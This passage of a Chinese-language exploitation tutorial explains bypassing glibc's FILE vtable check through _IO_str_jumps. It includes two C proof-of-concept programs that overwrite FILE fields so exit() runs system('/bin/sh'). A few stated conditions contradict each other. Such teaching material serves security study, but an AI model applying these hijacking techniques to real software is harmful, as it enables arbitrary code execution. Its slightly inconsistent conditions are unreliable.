若我们按照正常情况调用`_IO_FILE_plus`中的`_IO_overflow`函数，那么偏移是`vtable[3]`，对应到`IO_str_jumps`中就是`_overflow`函数。而我们刚刚提到，这些虚表在内存空间是完全连续的，如图所示：

![image-20231115174809654](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311151748725.png)

因此，我们只需要将`_IO_FILE_plus`的`vtable`的值覆盖为`_IO_str_jumps - 8 `，即可让`vtable[3]`指向`_IO_str_finish`函数，由此一来，我们以往的函数调用链`_IO_flush_all_lockp() -> _IO_new_file_overflow()`即可变为`_IO_flush_all_lockp() -> _IO_str_finish()`。

再来看如何修改`fp`指针对应偏移的函数，主要有这么两行：

```c
if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF)) // 满足安全机制
	(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); // 执行函数
```

首先第一行，要`fp->_flags & _IO_USER_BUF`不为0才可以。而`_IO_USER_BUF`实际上是一个宏，其定义为`#define _IO_USER_BUF 1`，因此只需要其`fp->_flags`，也就是偏移为0处的值的最低位为0即可。对于`fp->_IO_buf_base`，实际上是接下来要执行的函数的参数，我们要控制其不为0即可。

第二行，执行的函数看起来十分奇怪，其首先使用`(_IO_strfile*)`将`fp`进行变量类型的强制转换，然后再执行转换后的`fp`结构体指针指向的`_s`的`_free_buffer`存放的函数。我们需要控制`_free_buffer`中存放的函数才可以。实际上，我们知道C语言中结构体被解释为什么不重要，它对应的偏移才重要，那么我们在`gdb`中查看到`((_IO_strfile *) fp)->_s._free_buffer`对应`fp`起始处的偏移，然后将其覆盖为`system`即可。如图所示：

若我们将`fp`解释为`(_IO_FILE_plus*)`，那么`fp`为：

![image-20231116100909250](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311161009392.png)

将其解释为`_IO_strfile *`，那么其会变为：

![image-20231116101103720](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311161011768.png)

可以看到，实际上内存中的值不会发生变化，只是看如何对其进行解释。那么我们查看`((_IO_strfile *) fp)->_s._free_buffer`的偏移如下：

![image-20231116101344044](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311161013086.png)

即覆盖对应`fp`偏移为`0xe8`处的函数为`system`，覆盖`fp->_IO_buf_base`处的值为`/bin/sh\x00`的地址即可执行`system('/bin/sh')`。

以C语言手写一个`glibc2.24`下的`vtable check`绕过如下：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void winner(char* code){
    // system("echo win");
    printf("you got it!\n");
    printf("The code is :%s.\n", code);
    system(code);
}

// vtable的检查方式是在调用vtable函数时，检查vtable是否在 __stop___libc_IO_vtables和__start___libc_IO_vtables之间。
// 而这两个变量之间并不是只有_IO_file_jumps，还有其他很多vtable，例如_IO_str_jumps，以及_IO_wstr_jumps
// 因此我们可以劫持vtable为_IO_str_jumps，然后再覆盖掉_IO_str_jumps里面的函数来完成FSOP
int main(){
    // 我们通过打开一个文件的方式，来得到一个_IO_FILE_plus指针fp
    FILE* fp = fopen("./flag", "r");

    // 要满足安全机制
    *(size_t*)((char*)fp + 0x20) = 1;
    *(size_t*)((char*)fp + 0x28) = 2;

    // 偏移0x38的地方即_IO_buf_base，是函数调用的参数
    // 假如是正常退出，栈都清空了，就会导致winner没有参数，别的方法可以
    char code[] = "/bin/sh\x00";
    *(size_t*)((char*)fp + 0x38) = (size_t)&code;

    // flag的最低为要为0
    *(char*)(fp) = (char)0;

    // 最终调用函数为fp->_s._free_buffer，偏移为0xe8
    *(size_t*)((char*)fp + 0xe8) = (size_t)winner;

    // vtable我们设置为_IO_str_jumps - 8,由此一来要调用的vtable[3]就成为了_IO_str_finish而不是_IO_OVERFLOW
    // _IO_str_jumps的值比_IO_file_jumps的值要大0xc0
    size_t _IO_str_jumps_ = (size_t)(*(size_t*)((char*)fp + 0xd8)) + 0xc0;

    // 设置为_IO_str_jumps - 8
    *(size_t*)((char*)fp + 0xd8) = _IO_str_jumps_ - 8;

    exit(1);
    // // 最终会在exit、return、以及libc执行abort调用。
    // return 0;
}
```

总结一下函数调用链`_IO_flush_all_lockp() -> _IO_str_finish() -> system()`需要满足的条件：

- `fp -> _IO_write_ptr`大于`fp -> _IO_write_base` ，分别对应`fp`偏移`0x20`和`0x28`（这是`_IO_flush_all_lockp()`要满足的条件）
- `fp -> _flag`最低为为`0`，偏移为`0x0`
- 设置`vtable`为`_IO_str_jumps - 0x8`，定位`_IO_str_jumps`可以通过`_IO_file_jumps`等虚表定位。
- `fp -> _IO_buf_base`存放要执行函数的参数的地址，偏移为`0x38`
- `(_IO_strfile* )fp -> _s._free_buffer`存放要执行的函数，对应偏移为`0xe8`

## 另一条调用链 _IO_flush_all_lockp -> _IO_str_overflow（<=glibc2.27可用）

原理和上面的利用链是一样的，我们此处不再详细阐述，仅仅写下需要构造的条件来供查阅。

- `fp -> _flag`最低两字节为`0`。其偏移为`0`。
- `fp -> _vtable`指向`_IO_str_jumps`。`_vtable`偏移为`0xd8`
- 偏移`0xe0`处为要执行的函数，例如`system`
- `fp -> _IO_buf_base`为`0`，其偏移为`0x38`
- `fp -> _IO_buf_end`为`(bin_sh_addr - 100) / 2`，其偏移为`0x40`。其中`bin_sh_addr`是函数参数的地址，若为奇数需要`+1`
- `fp -> _IO_write_base`为`0`，其偏移为`0x20`
- `fp -> _IO_write_ptr`为`0`，其偏移为`(bin_sh_addr - 100) / 2 + 1`

上面是通常情况下可以调用函数的参数设置，也可以看下面的C语言实现，其中注释包含了详细的要求：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void winner(char* code){
    // system("echo win");
    printf("you got it!\n");
    printf("The code is :%s.\n", code);
    system(code);
}

// fake_vtable.c中写的是利用_IO_str_jump表中的_IO_finish函数，而本代码中使用_IO_str_jump表中的_IO_overflow函数
int main(){
    // 我们通过打开一个文件的方式，来得到一个_IO_FILE_plus指针fp
    FILE* fp = fopen("./flag", "r");

    // _IO_write_base相对于fp偏移为0x20
    // _IO_write_ptr为0x28
    // _IO_buf_base为0x38
    // _IO_buf_end为0x40

    // 要满足fp->_flags & _IO_NO_WRITES 为假，而_IO_NO_WRITES的值为8，因此倒数第二个字节要为0
    // 又要满足fp->_flags & _IO_USER_BUF为假，而_IO_USER_BUF的值为1，因此最后一个字节也为0
    *(short*)fp = 0;

    // 虚表指向_IO_str_jumps
    *(size_t*)((char*)fp + 0xd8) = *(size_t*)(((char*)fp + 0xd8)) + 0xc0;

    // 此时偏移0xe0处是要执行的函数_IO_str_overflow
    *(size_t*)((char*)fp + 0xe0) = (size_t)winner;

    // 函数参数：new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100
    // 为了方便我们一般直接设置fp->_IO_buf_base为0，方便计算，那么2 * fp->_IO_buf_end + 100 需要等于函数参数例如/bin/sh的地址
    // 换算一下也就是 _IO_buf_end = (bin_sh_addr - 100) / 2，注意当bin_sh_addr为奇数的时候向下取整，因此地址为奇数的时候直接将其+1
    *(size_t*)((char*)fp + 0x38) = 0;
    char* code = "/bin/sh\x00";
    size_t address = (size_t)code % 2 == 0 ? (size_t)code : (size_t) code + 1; 
    *(size_t*)((char*)fp + 0x40) = (size_t)((address - 100) / 2);
    
    // 下一个条件： 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100不能为负数，由于其为函数参数上面已经构造，不再需要管

    // 下一个条件：(pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1))
    // 我们已经知道fp->_IO_buf_base为0，_IO_buf_end为(bin_sh_addr - 100)/2
    // 那么在同样设置fp->_IO_write_base为0的情况下，需要fp->_IO_write_ptr >= (bin_sh_addr - 100)/2 + 1
    *(size_t*)((char*)fp + 0x20) = 0;
    *(size_t*)((char*)fp + 0x28) = (size_t)((address - 100) / 2 + 1);
    
    

    exit(1);
    // // 最终会在exit、return、以及libc执行abort调用。
    return 0;
}
```

## 后记

绕过`vtable check`的方法除了`_IO_str_jumps`虚表，`_IO_wstr_jumps`虚表也是同样的。`_IO_wstr_jumps`和`_IO_str_jumps`功能基本一致，只是`_IO_wstr_jumps`是处理`wchar`的。

上面提到了这些`vtable check`的绕过方法都只是在`glibc2.27`及以下可用，因为到了`glibc2.28`中，`_IO_strfile`中的`_allocate_buffer`和`_free_buffer`已经被简单粗暴地用`malloc`和`free`来替换了，自然也就没有函数指针用于覆盖。

参考链接：

[raycp师傅的IO_FILE vtable绕过](https://xz.aliyun.com/t/5579#toc-1)

# IO_FILE基础知识供查阅

## _IO_FILE结构体和对应起始处的偏移

```c
// 这只是我随便在gdb找了个_IO_FILE_plus结构体，仅仅用来查看其成员变量和偏移
{
_flags = 0xfbad2488, // 偏移0
_IO_read_ptr = 0x0, // 0x8
_IO_read_end = 0x0, // 0x10
_IO_read_base = 0x0, // 0x18
_IO_write_base = 0x0, // 0x20
_IO_write_ptr = 0x0, // 0x28
_IO_write_end = 0x0, // 0x30
_IO_buf_base = 0x0, // 0x38
_IO_buf_end = 0x0, // 0x40
_IO_save_base = 0x0, // 0x48
_IO_backup_base = 0x0, // 0x50
_IO_save_end = 0x0, // 0x58
_markers = 0x0, // 0x60
_chain = 0x7ffff7dd2540, // 0x68
_fileno = 0x3, // 0x70
_flags2 = 0x0, // 0x74
_old_offset = 0x0, // 0x78
_cur_column = 0x0, // 0x80 大小为0x2
_vtable_offset = 0x0, // 0x82 大小为0x1
_shortbuf = {0x0}, // 0x83 大小为0x5
_lock = 0x5555555590f0, // 0x88
_offset = 0xffffffffffffffff, // 0x90
_codecvt = 0x0, // 0x98
_wide_data = 0x555555559100, // 0xa0
_freeres_list = 0x0, // 0xa8
_freeres_buf = 0x0, // 0xb0
__pad5 = 0x0, // 0xb8
_mode = 0x0, // 0xc0 大小为0x4
_unused2 = {0x0 <repeats 20 times>} // 0xc4 大小0x14
},
vtable = 0x7ffff7dd06e0 // 0xd8
```

